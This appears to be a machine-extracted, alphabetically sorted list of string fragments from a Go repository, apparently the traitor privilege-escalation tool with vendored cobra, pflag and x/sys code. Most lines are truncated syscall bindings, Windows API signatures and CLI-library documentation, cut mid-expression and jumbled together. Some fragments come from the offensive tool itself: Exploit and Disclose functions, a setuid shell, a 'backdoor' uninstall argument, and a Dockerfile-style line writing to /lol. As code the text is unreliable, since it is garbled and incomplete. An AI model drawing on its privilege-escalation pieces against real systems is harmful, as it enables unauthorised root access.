"5:  ""trace/breakpoint trap"","
"60s..."")"
"64  // sizeof_field(struct hid_device, phys)"
"64  // sizeof_field(struct hid_device, uniq)"
"64(FP), R12"
"6:  ""aborted"","
"72(FP), R12"
"7:  ""bus error"","
"8(FP), A0"
"8(FP), CX"
"8(FP), DI"
"8(FP), R0"
"8(FP), R1       // Move function arguments into registers"
"8(FP), R1"
"8(FP), R15"
"8(FP), R2"
"8(FP), R3"
"8(FP), R4"
"8(FP), R5"
"8:  ""floating point exception"","
"9, 11,"
"9:  ""killed"","
": A good place to use Active Help messages is when the normal completion system does not provide any suggestions. In such cases, Active Help nicely supplements the normal shell completions to guide the user in knowing what is expected by the program."
": As can be seen in the above example, a good place to use Active Help messages is when the normal completion system does not provide any suggestions. In such cases, Active Help nicely supplements the normal shell completions."
": Because of backward-compatibility requirements, we were forced to have a different API to disable completion descriptions between "
": If a user wants to disable Active Help for every single program based on Cobra, she can set the environment variable "
": You have a flag named ""secretFlag"" that you need for internal use only and don't want it showing up in help text, or for its usage text to be available."
": You want -, _, and . in flags to compare the same. aka --my-flag == --my_flag == --my.flag"
": You want to deprecate a flag named ""badflag"" as well as inform the users what flag they should use instead."
": You want to keep a flag name ""noshorthandflag"" but deprecate its shortname ""n""."
":dirname:_files -/'"" ${flagPrefix}"""
":filename:'""$filteringCmd"""
":filename:_files'"" ${flagPrefix}"""
"</yellow><blue>]</blue>"")"
"= ""        ""[:needspace]"
"= ""    local_nonpersistent_flags"
"= "" "" "
"= "" """
"= "" [flags]"""
"= ""="""
"= ""flags"
"= ""this command"""
"= ""two_word_"""
"= copy(buf[addr%SizeofPtr:], data)"
"= copy(out, buf[addr%SizeofPtr:])"
"= fmt.Sprintf("" (DEPRECATED: %s)"", flag.Deprecated)"
"= fmt.Sprintf("" (default %q)"", flag.DefValue)"
"= fmt.Sprintf("" (default %s)"", flag.DefValue)"
"= fmt.Sprintf("""
"= fmt.Sprintf(""[="
"= fmt.Sprintf(""[=%s]"", flag.NoOptDefVal)"
"=""  ($desc)"""
"="" """
"="" ${flagPrefix}"""
"="" -g $filter"""
"="" }' "
"=""$filter"
"=' ""$lastArg"")"
"=(""$comp"")"
"=(""$compline"")"
"=(""${must_have_one_flag[@]}"")"
"=(""${must_have_one_noun[@]}"")"
"=(""${words[c]}"")"
">"": {op: pessimistic, f: constraintPessimistic},"
"A file containing all of the system's generated error numbers, error strings,"
"A flag can also be assigned locally, which will only apply to that specific command."
"A flag can be 'persistent', meaning that this flag will be available to the"
"A0, r1"
"A1, r2"
"ACL, daclDefaulted "
"ACL, daclDefaulted bool) (err error) = advapi32.SetSecurityDescriptorDacl"
"ACL, daclDefaulted bool) (err error) {"
"ACL, daclSize "
"ACL, defaulted bool, err error) {"
"ACL, err error) {"
"ACL, newACL "
"ACL, present, defaulted bool) error {"
"ACL, sacl "
"ACL, saclDefaulted "
"ACL, saclDefaulted bool) (err error) = advapi32.SetSecurityDescriptorSacl"
"ACL, saclDefaulted bool) (err error) {"
"ACL, saclSize "
"ACL, sd "
"ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"AX, r1"
"AcceptEx(ls Handle, as Handle, buf "
"Access(path string, mode uint32) (err error)"
"Active Help is a framework provided by Cobra which allows a program to define messages (hints, warnings, etc) that will be printed during program usage.  It aims to make it easier for your users to learn how to use your program.  If configured by the program, Active Help is printed when the user triggers shell completion."
"AddKey(keyType string, description string, payload []byte, ringid int) (id int, err error)"
"Addr:     pp.Bdaddr,"
"Addr:    [6]byte{0x11, 0x22, 0x33, 0xaa, 0xbb, 0xcc}, // CC:BB:AA:33:22:11"
"Addr:    [6]uint8{0, 0, 0, 0, 0, 0}, // BDADDR_ANY or 00:00:00:00:00:00"
"Addr:    pp.Bdaddr,"
"Addr:   addr,"
"AddrType: pp.Bdaddr_type,"
"AddrinfoW, result "
"AdjustTokenGroups(token Token, resetToDefault bool, newstate "
"AdjustTokenPrivileges(token Token, disableAllPrivileges bool, newstate "
"After all flags are defined, call"
"After parsing, the arguments after the flag are available as the"
"Alarm(seconds uint) (remaining uint, err error)"
"Aliases:               []string{ShellCompNoDescRequestCmd},"
"Alpine       DistributionID = ""alpine"""
"An example of two commands which use all of these features is below.  When the subcommand is executed, it will run the root command's "
"Annotations: annotation,"
"Anyone is free to copy, modify, publish, use, compile, sell, or"
"Arch         DistributionID = ""arch"""
"Args:                  MinimumNArgs(1),"
"Args:                  NoArgs,"
"Args:                  cobra.ExactValidArgs(1),"
"Args:              NoArgs,"
"Args:   []string{path, ""setuid""},"
"Args:   []string{setuidShell},"
"Args:  cobra.MaximumNArgs(1),"
"Args:  require.ExactArgs(2),"
"Args: []string{path, ""backdoor"", ""uninstall""},"
"Args: cobra.ExactArgs(0),"
"As Active Help uses the shell completion system, the implementation of Active Help messages is done by enhancing custom dynamic completions.  If you are not familiar with dynamic completions, please refer to [Shell Completions](shell_completions.md)."
"As for nouns, Cobra provides a way of defining dynamic completion of flags.  To provide a Go function that Cobra will execute when it needs the list of completion choices for a flag, you must register the function using the "
"AssignProcessToJobObject(job Handle, process Handle) (err error) = kernel32.AssignProcessToJobObject"
"Asyncreads:  old.Asyncreads,"
"Asyncwrites: old.Asyncwrites,"
"Atim:    old.Atim,"
"AutoCompleteCallback func(line string, pos int, key rune) (newLine string, newPos int, ok bool)"
"Available Commands:{{range .Commands}}{{if (or .IsAvailableCommand (eq .Name ""help""))}}"
"BIN=""./bin"""
"BIND_OPTS3, guid "
"BashCompCustom          = ""cobra_annotation_bash_completion_custom"""
"BashCompFilenameExt     = ""cobra_annotation_bash_completion_filename_extensions"""
"BashCompOneRequiredFlag = ""cobra_annotation_bash_completion_one_required_flag"""
"BashCompSubdirsInDir    = ""cobra_annotation_bash_completion_subdirs_in_dir"""
"BashCompletionFunction: bash_completion_func,"
"Bavail:      old.Bavail,"
"Bfree:       old.Bfree,"
"Bind(fd, addr)"
"Black, Red, Green, Yellow, Blue, Magenta, Cyan, White []byte"
"Black:   []byte{keyEscape, '[', '3', '0', 'm'},"
"Blksize: old.Blksize,"
"Blocks:      old.Blocks,"
"Blocks:  old.Blocks,"
"Blue:    []byte{keyEscape, '[', '3', '4', 'm'},"
"BoolVarP(p, name, """", value, usage)"
"Boolean flags (in their long form) accept 1, 0, t, f, true, false,"
"Breaking changes are generally allowed in the master branch, as this is the branch used to develop the next release of Cobra."
"Breaking changes are not allowed in release branches, as these represent minor versions that have already been released. These version have consumers who expect the APIs, behaviors, etc, to remain stable during the lifetime of the patch stream for the minor release."
"Bsize:       old.Bsize,"
"Btim:    old.Btim,"
"By default, Cobra only parses local flags on the target command, and any local flags on"
"CAA(R8), R9"
"CGO_ENABLED=0 go install -ldflags ""-X github.com/liamg/traitor/version.Version="
"CID:      pp.Cid,"
"CID:   pp.Cid,"
"CID:  pp.Cid,"
"CMD echo """" > /lol"
"CM_GET_DEVICE_INTERFACE_LIST_ALL_DEVICES = 1 // all registered device interfaces, live or not"
"COMMAND=""mksysnum_plan9.sh $@"""
"COMPREPLY[@]}"" -eq ""1"" ]] "
"CSMAP_DIR                     = ""/usr/lib/nls/csmap/"""
"CancelIoEx(s Handle, o "
"CapRights, clearrights []uint64) error {"
"CapRights, error) {"
"CapRights, setrights []uint64) (bool, error) {"
"CapRights, setrights []uint64) error {"
"CapUserHeader, data "
"CentOS       DistributionID = ""centos"""
"CertAddCertificateContextToStore(store Handle, certContext "
"CertChainContext, err error) [failretval==nil] = crypt32.CertFindChainInStore"
"CertChainContext, err error) {"
"CertChainContext, para "
"CertChainPara, flags uint32, reserved uintptr, chainCtx "
"CertChainPolicyPara, status "
"CertCloseStore(store Handle, flags uint32) (err error) = crypt32.CertCloseStore"
"CertContext, addDisposition uint32, storeContext "
"CertContext, err error) [failretval==nil] = crypt32.CertCreateCertificateContext"
"CertContext, err error) [failretval==nil] = crypt32.CertEnumCertificatesInStore"
"CertContext, err error) [failretval==nil] = crypt32.CertFindCertificateInStore"
"CertContext, err error) {"
"CertContext, flags uint32, parameters unsafe.Pointer, cryptProvOrNCryptKey "
"CertContext, nameType uint32, flags uint32, typePara unsafe.Pointer, name "
"CertContext, time "
"CertCreateCertificateContext(certEncodingType uint32, certEncoded "
"CertEnumCertificatesInStore(store Handle, prevContext "
"CertGetCertificateChain(engine Handle, leaf "
"CertOpenStore(storeProvider uintptr, msgAndCertEncodingType uint32, cryptProv uintptr, flags uint32, para uintptr) (handle Handle, err error) = crypt32.CertOpenStore"
"CertOpenSystemStore(hprov Handle, name "
"CertVerifyCertificateChainPolicy(policyOID uintptr, chain "
"ChangeServiceConfig(service Handle, serviceType uint32, startType uint32, errorControl uint32, binaryPathName "
"ChangeServiceConfig2(service Handle, infoLevel uint32, info "
"Channel: 1,"
"Channel: pp.Channel,"
"Chflags(path string, flags int) (err error)"
"Chmod(path string, mode uint32) (err error) = SYS___CHMOD_A"
"Chmod(path string, mode uint32) (err error)"
"Chown(path string, uid int, gid int) (err error) = SYS___CHOWN_A"
"Chown(path string, uid int, gid int) (err error)"
"ClassInstallHeader, classInstallParamsSize uint32) (err error) = setupapi.SetupDiSetClassInstallParamsW"
"ClassInstallHeader, classInstallParamsSize uint32) (err error) {"
"ClassInstallHeader, classInstallParamsSize uint32) error {"
"ClassInstallHeader, classInstallParamsSize uint32, requiredSize "
"ClockGetres(clockid int32, res "
"ClockGettime(clockid int32, time "
"ClockNanosleep(clockid int32, flags int, request "
"Clockinfo, error) {"
"Clonefile(src string, dst string, flags int) (err error)"
"Clonefileat(srcDirfd int, src string, dstDirfd int, dst string, flags int) (err error)"
"CloseRange(first uint, last uint, flags uint) (err error)"
"Cmsghdr, []byte, error) {"
"CoInitializeEx(reserved uintptr, coInit uint32) (ret error) = ole32.CoInitializeEx"
"Cobra 1.1 standardized its zsh completion support to align it with its other shell completions.  Although the API was kept backward-compatible, some small changes in behavior were introduced."
"Cobra 1.1 standardized its zsh completion support to align it with its other shell completions.  Although the API was kept backwards-compatible, some small changes in behavior were introduced."
"Cobra achieves dynamic completion through the use of a hidden command called by the completion script.  To debug your Go completion code, you can call this hidden command directly:"
"Cobra allows you to add descriptions to your own completions.  Simply add the description text after each completion, following a "
"Cobra can generate a shell-completion file for the following shells: bash, zsh, fish, PowerShell. If you add more information to your commands, these completions can be amazingly powerful and flexible.  Read more about it in [Shell Completions](shell_completions.md)."
"Cobra can generate documentation based on subcommands, flags, etc. Read more about it in the [docs generation documentation](doc/README.md)."
"Cobra is built on a structure of commands, arguments "
"Cobra is used in many Go projects such as [Kubernetes](https://kubernetes.io/),"
"Cobra makes use of the shell-completion system to define a framework allowing you to provide Active Help to your users.  Active Help are messages (hints, warnings, etc) printed as the program is being used.  Read more about it in [Active Help](active_help.md)."
"Cobra will follow a steady release cadence. Non breaking changes will be released as minor versions quarterly. Patch bug releases are at the discretion of the maintainers. Users can expect security patch fixes to be released within relatively short order of a CVE becoming known. For more information on security patch fixes see the CVE section below. Releases will follow [Semantic Versioning](https://semver.org/). Users tracking the Master branch should expect unpredictable breaking changes as the project continues to move forward. For stability, it is highly recommended to use a release."
"Cobra will print automatic suggestions when ""unknown command"" errors happen. This allows Cobra to behave similarly to the "
"Command) GenBashCompletionFileV2(filename string, includeDesc bool) error {"
"Command) GenBashCompletionV2(w io.Writer, includeDesc bool) error {"
"Command) GenFishCompletion(w io.Writer, includeDesc bool) error {"
"Command) GenFishCompletionFile(filename string, includeDesc bool) error {"
"Command) MarkFlagCustom(name string, f string) error {"
"Command) MarkFlagFilename(name string, extensions ...string) error {"
"Command) MarkPersistentFlagFilename(name string, extensions ...string) error {"
"Command) MarkZshCompPositionalArgumentFile(argPosition int, patterns ...string) error {"
"Command) MarkZshCompPositionalArgumentWords(argPosition int, words ...string) error {"
"Command) PrintErrf(format string, i ...interface{}) {"
"Command) Printf(format string, i ...interface{}) {"
"Command) RegisterFlagCompletionFunc(flagName string, f func(cmd "
"Command) genBashCompletion(w io.Writer, includeDesc bool) error {"
"Command) genPowerShellCompletion(w io.Writer, includeDesc bool) error {"
"Command) genPowerShellCompletionFile(filename string, includeDesc bool) error {"
"Command) genZshCompletion(w io.Writer, includeDesc bool) error {"
"Command) genZshCompletionFile(filename string, includeDesc bool) error {"
"Command, 0)"
"Command, []string) ("
"Command, []string) {"
"Command, []string)"
"Command, []string)) {"
"Command, []string))"
"Command, []string, ShellCompDirective, error) {"
"Command, []string, error) {"
"Command, a []string) {"
"Command, args []string) error {"
"Command, args []string) error"
"Command, args []string) {"
"Command, args []string)"
"Command, args []string, lastArg string) ("
"Command, args []string, toComplete string) ([]string, ShellCompDirective) {"
"Command, args []string, toComplete string) ([]string, ShellCompDirective)"
"Command, args []string, toComplete string) ([]string, ShellCompDirective)) error {"
"Command, args []string, toComplete string) ([]string, ShellCompDirective){}"
"Command, err error) error {"
"Command, err error) {"
"Command, error) error"
"Command, error) error) {"
"Command, error) {"
"Command, innerArgs []string) ("
"Command, name string) "
"Command, toComplete string) []string {"
"CommandLine.CountVar(p, name, usage)"
"CommandLine.CountVarP(p, name, shorthand, usage)"
"CommandLine.ParseAll(os.Args[1:], fn)"
"CommandLine.VarP(newBoolSliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newBoolSliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newBytesBase64Value(value, p), name, """", usage)"
"CommandLine.VarP(newBytesBase64Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newBytesHexValue(value, p), name, """", usage)"
"CommandLine.VarP(newBytesHexValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newDurationSliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newDurationSliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newDurationValue(value, p), name, """", usage)"
"CommandLine.VarP(newDurationValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newFloat32SliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newFloat32SliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newFloat32Value(value, p), name, """", usage)"
"CommandLine.VarP(newFloat32Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newFloat64SliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newFloat64SliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newFloat64Value(value, p), name, """", usage)"
"CommandLine.VarP(newFloat64Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIPMaskValue(value, p), name, """", usage)"
"CommandLine.VarP(newIPMaskValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIPNetValue(value, p), name, """", usage)"
"CommandLine.VarP(newIPNetValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIPSliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newIPSliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIPValue(value, p), name, """", usage)"
"CommandLine.VarP(newIPValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newInt16Value(value, p), name, """", usage)"
"CommandLine.VarP(newInt16Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newInt32SliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newInt32SliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newInt32Value(value, p), name, """", usage)"
"CommandLine.VarP(newInt32Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newInt64SliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newInt64SliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newInt64Value(value, p), name, """", usage)"
"CommandLine.VarP(newInt64Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newInt8Value(value, p), name, """", usage)"
"CommandLine.VarP(newInt8Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIntSliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newIntSliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newIntValue(value, p), name, """", usage)"
"CommandLine.VarP(newIntValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newStringArrayValue(value, p), name, """", usage)"
"CommandLine.VarP(newStringArrayValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newStringSliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newStringSliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newStringToInt64Value(value, p), name, """", usage)"
"CommandLine.VarP(newStringToInt64Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newStringToIntValue(value, p), name, """", usage)"
"CommandLine.VarP(newStringToIntValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newStringToStringValue(value, p), name, """", usage)"
"CommandLine.VarP(newStringToStringValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newStringValue(value, p), name, """", usage)"
"CommandLine.VarP(newStringValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newUint16Value(value, p), name, """", usage)"
"CommandLine.VarP(newUint16Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newUint32Value(value, p), name, """", usage)"
"CommandLine.VarP(newUint32Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newUint64Value(value, p), name, """", usage)"
"CommandLine.VarP(newUint64Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newUint8Value(value, p), name, """", usage)"
"CommandLine.VarP(newUint8Value(value, p), name, shorthand, usage)"
"CommandLine.VarP(newUintSliceValue(value, p), name, """", usage)"
"CommandLine.VarP(newUintSliceValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(newUintValue(value, p), name, """", usage)"
"CommandLine.VarP(newUintValue(value, p), name, shorthand, usage)"
"CommandLine.VarP(value, name, """", usage)"
"CommandLine.VarP(value, name, shorthand, usage)"
"CompDebug(fmt.Sprintf(""%s"
"CompDebug(msg, true)"
"CompError(fmt.Sprintf(""%s"
"Completion of a flag name does not repeat, unless flag is of type "
"ConnectNamedPipe(pipe Handle, overlapped "
"Constraint, error) {"
"Constraint, len(vs))"
"ControlService(service Handle, control uint32, status "
"CopyFileRange(rfd int, roff "
"CopySid(destSidLen uint32, destSid "
"Copyright (c) 2009,2014 Google Inc. All rights reserved."
"Creat(path string, mode uint32) (fd int, err error)"
"CreateFileMapping(fhandle Handle, sa "
"CreateIoCompletionPort(filehandle Handle, cphandle Handle, key uintptr, threadcnt uint32) (handle Handle, err error)"
"CreateProcessAsUser(token Token, appName "
"CreateService(mgr Handle, serviceName "
"CreateToolhelp32Snapshot = kernel.MustFindProc(""CreateToolhelp32Snapshot"")"
"CreateToolhelp32Snapshot(flags uint32, processId uint32) (handle Handle, err error) [failretval==InvalidHandle] = kernel32.CreateToolhelp32Snapshot"
"CryptDataBlob, password "
"CryptDecodeObject(encodingType uint32, structType "
"CryptGenRandom(provhandle Handle, buflen uint32, buf "
"CryptProtectPromptStruct, flags uint32, dataOut "
"CryptQueryObject(objectType uint32, object unsafe.Pointer, expectedContentTypeFlags uint32, expectedFormatTypeFlags uint32, flags uint32, msgAndCertEncodingType "
"CryptReleaseContext(provhandle Handle, flags uint32) (err error) = advapi32.CryptReleaseContext"
"Ctim:    old.Ctim,"
"Cyan:    []byte{keyEscape, '[', '3', '6', 'm'},"
"DATA, OR PROFITS"
"DEVLINK_GENL_MCGRP_CONFIG_NAME              = ""config"""
"DEVLINK_GENL_NAME                           = ""devlink"""
"DEVPROPKEY) (value interface{}, err error) {"
"DEVPROPKEY, propertyType "
"DEVPROPTYPE, propertyBuffer "
"DI_FLAGSEX_PROPCHANGE_PENDING       DI_FLAGSEX = 0x00000400 // One or more device property sheets have had changes made to them, and need to have a DIF_PROPERTYCHANGE occur."
"DI_FLAGSEX_SEARCH_PUBLISHED_INFS    DI_FLAGSEX = 0x80000000 // Tell SetupDiBuildDriverInfoList to do a ""published INF"" search"
"DI_NEEDREBOOT  DI_FLAGS = 0x00000100 // """""
"DI_REMOVEDEVICE_CONFIGSPECIFIC DI_REMOVEDEVICE = 0x00000002 // Make this change to only the hardware profile specified by HwProfile. this flag only applies to root-enumerated devices. When Windows removes the device from the last hardware profile in which it was configured, Windows performs a global removal."
"DLL, err error) {"
"DLL, error) {"
"DLL{Name: name, Handle: h}, nil"
"DM_CONTROL_NODE                             = ""control"""
"DM_DIR                                      = ""mapper"""
"DM_VERSION_EXTRA                            = ""-ioctl (2022-02-22)"""
"DNSRecord, freetype uint32) = dnsapi.DnsRecordListFree"
"DNSRecord, freetype uint32) {"
"DNSRecord, pr "
"DN_STOP_FREE_RES         = 0x00100000        // When child is stopped, free resources"
"DX, r2"
"Data1: 0xaac56b,"
"Data2: 0xcd44,"
"Data3: 0x11d0,"
"Data4: [8]byte{0x8c, 0xc2, 0x0, 0xc0, 0x4f, 0xc2, 0x95, 0xee},"
"DataBlob, name "
"DataBlob, reserved uintptr, promptStruct "
"Debian       DistributionID = ""debian"""
"Debugging your Active Help code is done in the same way as debugging your dynamic completion code, which is with Cobra's hidden "
"DefValue:  value.String(),"
"DefValue: goflag.Value.String(),"
"Define flags using flag.String(), Bool(), Int(), etc."
"DefineDosDevice(flags uint32, deviceName "
"DeleteModule(name string, flags int) (err error)"
"Deprecated          string              // If this flag is deprecated, this string is the new or now thing to use"
"Deprecation of Go versions or dependent packages will only occur in major releases. To reduce the change of this taking users by surprise, any large deprecation will be preceded by an announcement in the ["
"Description=""$Description""}"
"DestinationSAP: pp.Dsap,"
"Dev:     uint64(old.Dev),"
"DevInfoData) (string, error) {"
"DevInfoData, Scope DICS_FLAG, HwProfile uint32, KeyType DIREG, samDesired uint32) (Handle, error) {"
"DevInfoData, Scope DICS_FLAG, HwProfile uint32, KeyType DIREG, samDesired uint32) (key Handle, err error) [failretval==InvalidHandle] = setupapi.SetupDiOpenDevRegKey"
"DevInfoData, Scope DICS_FLAG, HwProfile uint32, KeyType DIREG, samDesired uint32) (key Handle, err error) {"
"DevInfoData, classInstallParams "
"DevInfoData, deviceInstallParams "
"DevInfoData, driverInfoData "
"DevInfoData, driverType SPDIT) (err error) = setupapi.SetupDiBuildDriverInfoList"
"DevInfoData, driverType SPDIT) (err error) = setupapi.SetupDiDestroyDriverInfoList"
"DevInfoData, driverType SPDIT) (err error) {"
"DevInfoData, driverType SPDIT) error {"
"DevInfoData, driverType SPDIT, memberIndex int) ("
"DevInfoData, driverType SPDIT, memberIndex uint32, driverInfoData "
"DevInfoData, err error) {"
"DevInfoData, error) {"
"DevInfoData, instanceId "
"DevInfoData, property SPDRP) (interface{}, error) {"
"DevInfoData, property SPDRP) (value interface{}, err error) {"
"DevInfoData, property SPDRP, propertyBuffer "
"DevInfoData, property SPDRP, propertyBuffers []byte) error {"
"DevInfoData, property SPDRP, propertyRegDataType "
"DevInfoData, property SPDRP, str string) error {"
"DevInfoData, propertyKey "
"DevInfoListDetailData, err error) {"
"DevInfoListDetailData, error) {"
"DevInstallParams, error) {"
"DeviceIdx:      pp.Dev_idx,"
"DeviceIdx:   pp.Dev_idx,"
"DeviceIoControl(handle Handle, ioControlCode uint32, inBuffer "
"DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {"
"Dir) Marshal(b []byte) (n int, err error) {"
"Dir, error) {"
"Dir:    ""/"","
"Dir: dir,"
"Dirent, error) {"
"Dirent, result "
"DisableFlagParsing:    true,"
"DisableFlagsInUseLine: true,"
"Disclose(ctx context.Context, s "
"Dll:  d,"
"DnsQuery(name string, qtype uint16, options uint32, extra "
"DrvInfoData) IsNewer(driverDate Filetime, driverVersion uint64) bool {"
"DrvInfoData, driverInfoDetailData "
"DrvInfoData, error) {"
"DrvInfoDetailData, driverInfoDetailDataSize uint32, requiredSize "
"DrvInfoDetailData, error) {"
"Dup(fd int) (nfd int, err error)"
"Dup(oldfd int) (fd int, err error)"
"Dup(oldfd int, newfd int) (fd int, err error)"
"Dup2(from int, to int) (err error)"
"Dup2(oldfd int, newfd int) (err error)"
"Dup3(from int, to int, flags int) (err error)"
"Dup3(oldfd int, newfd int, flags int) (err error)"
"DuplicateHandle(hSourceProcessHandle Handle, hSourceHandle Handle, hTargetProcessHandle Handle, lpTargetHandle "
"DuplicateTokenEx(existingToken Token, desiredAccess uint32, tokenAttributes "
"EACCES       = syscall.NewError(""access permission denied"")"
"EAFNOSUPPORT = syscall.NewError(""address family not supported by protocol"")"
"EBUSY        = syscall.NewError(""no free devices"")"
"EDCHPXV(R9), R9"
"EEXIST       = syscall.NewError(""file already exists"")"
"EINTR        = syscall.NewError(""interrupted"")"
"EINVAL       = syscall.NewError(""bad arg in system call"")"
"EIO          = syscall.NewError(""i/o error"")"
"EISDIR       = syscall.NewError(""file is a directory"")"
"EMFILE       = syscall.NewError(""no free file descriptors"")"
"ENAMETOOLONG = syscall.NewError(""file name too long"")"
"ENOENT       = syscall.NewError(""file does not exist"")"
"ENOTDIR      = syscall.NewError(""not a directory"")"
"EPERM        = syscall.NewError(""permission denied"")"
"EPLAN9       = syscall.NewError(""not supported by plan 9"")"
"EPOLLERR: POLLERR,"
"EPOLLHUP: POLLHUP,"
"EPOLLIN:  POLLIN,"
"EPOLLOUT: POLLOUT,"
"EPOLLPRI: POLLPRI,"
"ETHTOOL_GENL_NAME                           = ""ethtool"""
"ETHTOOL_MCGRP_MONITOR_NAME                  = ""monitor"""
"ETIMEDOUT    = syscall.NewError(""connection timed out"")"
"EXPLICIT_ACCESS, countAuditEntries uint32, auditEntries "
"EXPLICIT_ACCESS, oldACL "
"EXPLICIT_ACCESS, oldSecurityDescriptor "
"EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF"
"Each tag is enclosed in angle brackets, much like HTML."
"Echo works a lot like print, except it has a child command."
"EnumProcessModules(process Handle, module "
"EnumProcessModulesEx(process Handle, module "
"EnumProcesses(processIds []uint32, bytesReturned "
"EnumServicesStatusEx(mgr Handle, infoLevel uint32, serviceType uint32, serviceState uint32, services "
"Env:    os.Environ(),"
"Env:  os.Environ(),"
"EnvironmentSize, EnvironmentVersion uintptr"
"EpollCreate1(flag int) (fd int, err error)"
"EpollCtl(epfd int, op int, fd int, event "
"EpollEvent),"
"EpollWait(epfd int, events []EpollEvent, msec int) (n int, err error) = SYS_EPOLL_PWAIT"
"EpollWait(epfd int, events []EpollEvent, msec int) (n int, err error)"
"Err:     e,"
"ErrBadName   = errors.New(""bad character in file name"")"
"ErrBadStat   = errors.New(""malformed stat buffer"")"
"ErrShortStat = errors.New(""stat buffer too short"")"
"Error: unknown command ""remove"" for ""kubectl"""
"Error: unknown command ""srever"" for ""hugo"""
"EthtoolDrvinfo, error) {"
"EventPort) AssociateFd(fd uintptr, events int, cookie interface{}) error {"
"EventPort) AssociatePath(path string, stat os.FileInfo, events int, cookie interface{}) error {"
"EventPort) Get(s []PortEvent, min int, timeout "
"EventPort) Pending() (int, error) {"
"EventPort, error) {"
"Eventfd(initval uint, flags int) (fd int, err error) = SYS_EVENTFD2"
"Example: get_example,"
"Exchangedata(path1 string, path2 string, options int) (err error)"
"Execute should be run on the root for clarity, though it can be called on any command."
"ExitWindowsEx(flags uint32, reason uint32) (err error) = user32.ExitWindowsEx"
"Exploit(ctx context.Context, s "
"ExtattrDeleteFd(fd int, attrnamespace int, attrname string) (err error)"
"ExtattrDeleteFile(file string, attrnamespace int, attrname string) (err error)"
"ExtattrDeleteLink(link string, attrnamespace int, attrname string) (err error)"
"ExtattrGetFd(fd int, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error)"
"ExtattrGetFile(file string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error)"
"ExtattrGetLink(link string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error)"
"ExtattrListFd(fd int, attrnamespace int, data uintptr, nbytes int) (ret int, err error)"
"ExtattrListFile(file string, attrnamespace int, data uintptr, nbytes int) (ret int, err error)"
"ExtattrListLink(link string, attrnamespace int, data uintptr, nbytes int) (ret int, err error)"
"ExtattrSetFd(fd int, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error)"
"ExtattrSetFile(file string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error)"
"ExtattrSetLink(link string, attrnamespace int, attrname string, data uintptr, nbytes int) (ret int, err error)"
"FILE_FLAG_BACKUP_SEMANTICS, 0)"
"FILE_WRITE_ATTRIBUTES, FILE_SHARE_WRITE, nil,"
"FORMAT_MESSAGE_ARGUMENT_ARRAY, modntdll.Handle(), uint32(s), langID(LANG_ENGLISH, SUBLANG_ENGLISH_US), b, nil)"
"FSCRYPT_KEY_DESC_PREFIX                     = ""fscrypt:"""
"FSTYPE_AUTOMOUNT                = 0xc1 //""A"""
"FSTYPE_HFS                      = 0xc8 //""H"""
"FSTYPE_NFS                      = 0xd5 //""N"""
"FSTYPE_TFS                      = 0xe3 //""T"""
"FSTYPE_ZFS                      = 0xe9 //""Z"""
"FS_KEY_DESC_PREFIX                          = ""fscrypt:"""
"Faccessat(dirfd int, path string, mode uint32, flags int) (err error)"
"Faccessat2(dirfd int, path string, mode uint32, flags int) (err error)"
"Fadvise(fd int, offset int64, length int64, advice int) (err error) = SYS_FADVISE64"
"Fadvise(fd int, offset int64, length int64, advice int) (err error) = SYS_FADVISE64_64"
"Fadvise(fd int, offset int64, length int64, advice int) (err error) = SYS_POSIX_FADVISE"
"Fadvise(fd int, offset int64, length int64, advice int) (err error) = posix_fadvise64"
"Fallocate(fd int, mode uint32, off int64, len int64) (err error)"
"Family: AF_INET,"
"FanotifyInit(flags uint, event_f_flags uint) (fd int, err error)"
"Fchflags(fd int, flags int) (err error)"
"Fchmod(fd int, mode uint32) (err error)"
"Fchmodat(dirfd int, path string, mode uint32, flags int) (err error)"
"Fchown(fd int, uid int, gid int) (err error) = SYS_FCHOWN32"
